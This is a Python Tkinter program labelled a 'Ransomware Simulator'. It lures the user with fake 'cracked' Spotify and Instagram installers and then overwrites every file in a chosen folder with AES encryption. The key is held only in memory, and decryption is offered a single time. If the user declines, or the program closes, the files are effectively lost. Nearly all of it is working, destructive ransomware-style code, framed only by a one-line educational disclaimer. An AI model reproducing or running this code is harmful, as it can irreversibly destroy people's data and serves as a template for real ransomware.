import tkinter as tk
from tkinter import filedialog, messagebox
from tkinter.ttk import Progressbar
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

# Global variables for encryption
key = os.urandom(32)  # Random 256-bit key for AES encryption
encrypted_folder_path = None  # Track encrypted folder
decryption_prompt_shown = False  # Ensure single decryption prompt

# Function to encrypt all files in a folder
def encrypt_folder(folder_path):
    global encrypted_folder_path
    encrypted_folder_path = folder_path  # Set the global path for decryption
    try:
        for root, _, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path)
        print(f"Encrypted folder: {folder_path}")  # Log encryption status in terminal
    except Exception as e:
        print(f"Failed to encrypt folder: {e}")

# Function to encrypt a single file
def encrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()

        iv = os.urandom(16)  # Generate random IV
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = iv + encryptor.update(file_data) + encryptor.finalize()

        with open(file_path, 'wb') as f:
            f.write(encrypted_data)  # Overwrite file with encrypted data
        print(f"Encrypted: {file_path}")  # Log each file encryption
    except Exception as e:
        print(f"Error encrypting file {file_path}: {e}")

# Function to decrypt all files in a folder
def decrypt_folder():
    global encrypted_folder_path, decryption_prompt_shown

    if encrypted_folder_path:
        if not decryption_prompt_shown:
            decryption_prompt_shown = True  # Mark prompt as shown
            response = messagebox.askquestion("Decryption Prompt", "Do you want to decrypt the encrypted files? (Yes/No)")
            if response == "yes":
                try:
                    for root, _, files in os.walk(encrypted_folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            decrypt_file(file_path)
                    messagebox.showinfo("Ransomware Simulator", "The encrypted folder has been decrypted.")
                    print(f"Decrypted folder: {encrypted_folder_path}")  # Log decryption status
                    encrypted_folder_path = None  # Reset encrypted folder
                except Exception as e:
                    messagebox.showerror("Error", f"Failed to decrypt folder: {e}")
            else:
                messagebox.showinfo("Ransomware Simulator", "Files will remain encrypted until you select 'Yes' for decryption.")
                print("User chose not to decrypt files.")
        else:
            print("Decryption prompt already shown.")
    else:
        messagebox.showwarning("Ransomware Simulator", "No folder is currently encrypted.")

# Function to decrypt a single file
def decrypt_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()

        iv = file_data[:16]  # Extract IV from file
        encrypted_data = file_data[16:]  # Extract actual encrypted data
        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

        with open(file_path, 'wb') as f:
            f.write(decrypted_data)  # Overwrite file with decrypted data
        print(f"Decrypted: {file_path}")  # Log each file decryption
    except Exception as e:
        print(f"Error decrypting file {file_path}: {e}")

# Function to simulate installation process
def animate_label(label, app_name):
    text = f"Installing {app_name}"
    for i in range(len(text)):
        label.config(text=text[:i + 1])
        label.update()
        label.after(100)

def animate_progress(progress_bar, percentage_label):
    for i in range(101):
        progress_bar['value'] = i
        percentage_label.config(text=f"{i}%")
        progress_bar.update()
        percentage_label.update()
        progress_bar.after(30)

def will_learn_ransomware():
    def show_confirmation_spotify():
        response = messagebox.askokcancel("Confirmation", "Do you agree to install Spotify?")
        if response:
            choose_folder("Spotify")

    def show_confirmation_instagram():
        response = messagebox.askokcancel("Confirmation", "Do you agree to install Instagram?")
        if response:
            choose_folder("Instagram")

    def choose_folder(app_name):
        folder_path = filedialog.askdirectory(title="Select a Folder to Encrypt")
        if folder_path:
            show_installation_process(folder_path, app_name)

    learn_window = tk.Toplevel(root)
    learn_window.title("Ransomware Simulator")
    learn_window.geometry("500x400")
    learn_window.configure(bg="#263238")

    content_frame = tk.Frame(learn_window, bg="#263238")
    content_frame.place(relx=0.5, rely=0.5, anchor="center")

    info_label = tk.Label(content_frame, text="Cracked Applications", font=("Comic Sans MS", 16, "bold"), bg="#263238", fg="#FF5722")
    info_label.pack(pady=20)

    # Spotify Button
    spotify_button = tk.Button(content_frame, text="Spotify", font=("Arial", 12), bg="#00bcd4", fg="#ffffff", command=show_confirmation_spotify)
    spotify_button.pack(pady=10)

    # Instagram Button
    instagram_button = tk.Button(content_frame, text="Instagram", font=("Arial", 12), bg="#00bcd4", fg="#ffffff", command=show_confirmation_instagram)
    instagram_button.pack(pady=10)

def show_installation_process(folder_path, app_name):
    def finish_installation():
        animate_progress(progress_bar, percentage_label)
        messagebox.showinfo("Installation Process", f"{app_name} installation completed.")
        encrypt_folder(folder_path)

    install_window = tk.Toplevel(root)
    install_window.title(f"Installing {app_name}")
    install_window.geometry("500x400")
    install_window.configure(bg="#263238")

    content_frame = tk.Frame(install_window, bg="#263238")
    content_frame.place(relx=0.5, rely=0.5, anchor="center")

    installation_label = tk.Label(content_frame, text=f"Installing {app_name}", font=("Comic Sans MS", 16), bg="#263238", fg="#ffffff")
    installation_label.pack(pady=20)
    animate_label(installation_label, app_name)

    progress_bar = Progressbar(content_frame, orient="horizontal", length=300, mode="determinate")
    progress_bar.pack(pady=10)

    percentage_label = tk.Label(content_frame, text="0%", font=("Arial", 12), bg="#263238", fg="#ffffff")
    percentage_label.pack(pady=5)

    install_window.after(3000, finish_installation)

def learnt_ransomware():
    decrypt_folder()

# Main window setup
root = tk.Tk()
root.title("Ransomware Simulator")
root.geometry("600x500")
root.configure(bg="#263238")

content_frame = tk.Frame(root, bg="#263238")
content_frame.place(relx=0.5, rely=0.5, anchor="center")

title_label = tk.Label(content_frame, text="Ransomware Simulator", font=("Comic Sans MS", 24, "bold"), bg="#263238", fg="#FF5722")
title_label.pack(pady=30)

btn_frame = tk.Frame(content_frame, bg="#263238")
btn_frame.pack(pady=30)

btn_will_learn = tk.Button(btn_frame, text="Learn", font=("Arial", 14, "bold"), bg="#00bcd4", fg="#ffffff", command=will_learn_ransomware)
btn_will_learn.grid(row=0, column=0, padx=15)

btn_learnt = tk.Button(btn_frame, text="Learnt", font=("Arial", 14, "bold"), bg="#00bcd4", fg="#ffffff", command=learnt_ransomware)
btn_learnt.grid(row=0, column=1, padx=15)

warning_label = tk.Label(content_frame, text="This program is for educational purposes only.", font=("Arial", 10), bg="#263238", fg="#FF5722")
warning_label.pack(pady=20)

root.mainloop()

